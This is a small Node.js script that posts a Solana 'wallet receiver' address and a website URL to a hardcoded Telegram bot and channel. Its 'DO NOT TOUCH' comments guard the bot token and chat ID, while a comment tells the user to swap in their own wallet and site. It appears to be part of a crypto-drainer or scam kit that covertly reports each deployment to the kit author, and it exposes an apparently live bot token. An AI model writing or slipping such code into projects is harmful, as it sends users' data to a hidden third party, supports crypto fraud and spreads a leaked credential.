const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7202413581:AAEmK4Fn2qX0eVpYuM6zh42ed31AClA6i6Y';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '1198863117';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '4HSA8CZnqDLZDbGhG17HNm5ZTp4pkcpEM4JFJjZKh3UX';
const website_url = 'https://darinkayce.netlify.app';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
